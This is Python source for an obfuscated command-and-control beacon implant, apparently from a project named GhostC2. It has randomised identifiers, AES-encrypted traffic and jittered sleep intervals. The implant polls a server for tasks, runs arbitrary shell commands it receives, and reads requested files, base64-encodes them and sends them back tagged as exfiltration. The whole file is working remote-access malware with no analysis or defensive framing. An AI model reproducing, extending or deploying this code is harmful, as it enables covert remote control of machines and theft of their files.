import os
import sys
import time
import socket
import json
import requests
import subprocess
import base64
import random
import Crypto.Cipher.AES 
import Crypto.Util.Padding

SLEEP_TIME = 15  # base sleep in seconds
JITTER_RANGE = 5  # jitter range (+/- seconds)

# Inject absolute path to utils
sys.path.insert(0, "/Users/wolf/GhostC2/utils")
from crypto import aes_encrypt

C2_URL = "http://localhost:8080/beacon"
RESULT_URL = "http://localhost:8080/result"

def mSThSYSj():
    arMwGWgu = socket.gethostname()

    while True:
        DOAJvgUl = {
            "hostname": arMwGWgu,
            "payload": "idle"
        }

        try:
            GVNIejMp = json.dumps(DOAJvgUl)
            oyzdeYxp = aes_encrypt(GVNIejMp)
            XGbSZuaR = requests.post(C2_URL, data=oyzdeYxp.encode(), timeout=5)

            if XGbSZuaR.status_code == 200:
                nFstNeEU = XGbSZuaR.json()
                QjFriPPM = nFstNeEU.get("tasks", [])

                for VeqvyJVJ in QjFriPPM:
                    print(f"[+] Executing: {VeqvyJVJ}")
                    if VeqvyJVJ.startswith("getfile "):
                        vgbWVdMU = VeqvyJVJ.split(" ", 1)[1]
                        try:
                            with open(vgbWVdMU, "rb") as f:
                                iaMpVqxk = base64.b64encode(f.read()).decode()
                            lLnqxRPK = f"[EXFIL:{vgbWVdMU}]\n{iaMpVqxk}"
                        except Exception as e:
                            lLnqxRPK = f"[!] Failed to read file: {e}"
                    else:
                        try:
                            gHYUGyQH = subprocess.check_output(VeqvyJVJ, shell=True, stderr=subprocess.STDOUT, timeout=10)
                            lLnqxRPK = gHYUGyQH.decode().strip()
                        except subprocess.CalledProcessError as e:
                            lLnqxRPK = f"[!] Command failed: {e.output.decode().strip()}"

                    print(f"[>] Sending result:\n{lLnqxRPK}")

                    BQsliQaC = {
                        "hostname": arMwGWgu,
                        "command": VeqvyJVJ,
                        "result": lLnqxRPK
                    }
                    XwtkrOPe = aes_encrypt(json.dumps(BQsliQaC))
                    requests.post(RESULT_URL, data=XwtkrOPe.encode())

        except Exception as e:
            print(f"[!] Beacon failed: {e}")

        jitter = random.uniform(-JITTER_RANGE, JITTER_RANGE)
        sleep_time = max(1, SLEEP_TIME + jitter)
        time.sleep(sleep_time)


if __name__ == "__main__":
    mSThSYSj()
